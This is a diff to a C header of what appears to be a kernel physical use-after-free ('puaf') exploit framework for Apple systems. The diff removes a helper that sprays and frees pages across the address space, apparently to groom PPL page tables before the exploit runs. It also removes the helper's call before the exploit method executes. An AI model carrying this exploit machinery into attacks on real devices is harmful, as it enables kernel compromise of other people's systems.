@@ -8,7 +8,6 @@
 // Forward declarations for helper functions.
 void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
 void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
-void puaf_helper_give_ppl_pages(void);
 
 #include "puaf/physpuppet.h"
 #include "puaf/smith.h"
@@ -39,8 +38,6 @@ void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
 
 void puaf_run(struct kfd* kfd)
 {
-    puaf_helper_give_ppl_pages();
-
     timer_start();
     kfd->puaf.puaf_method_ops.run(kfd);
     timer_end();
@@ -110,48 +107,6 @@ void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
 
     *min_out = data.min_address;
     *max_out = data.max_address;
-}
-
-void puaf_helper_give_ppl_pages(void)
-{
-    timer_start();
-
-    const u64 given_ppl_pages_max = 10000;
-    const u64 l2_block_size = (1ull << 25);
-
-    vm_address_t addresses[given_ppl_pages_max] = {};
-    vm_address_t address = 0;
-    u64 given_ppl_pages = 0;
-
-    u64 min_address, max_address;
-    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);
-
-    while (true) {
-        address += l2_block_size;
-        if (address < min_address) {
-            continue;
-        }
-
-        if (address >= max_address) {
-            break;
-        }
-
-        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
-        if (kret == KERN_SUCCESS) {
-            memset((void*)(address), 'A', 1);
-            addresses[given_ppl_pages] = address;
-            if (++given_ppl_pages == given_ppl_pages_max) {
-                break;
-            }
-        }
-    }
-
-    for (u64 i = 0; i < given_ppl_pages; i++) {
-        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
-    }
-
-    print_u64(given_ppl_pages);
-    timer_end();
 }
 
 #endif /* puaf_h */
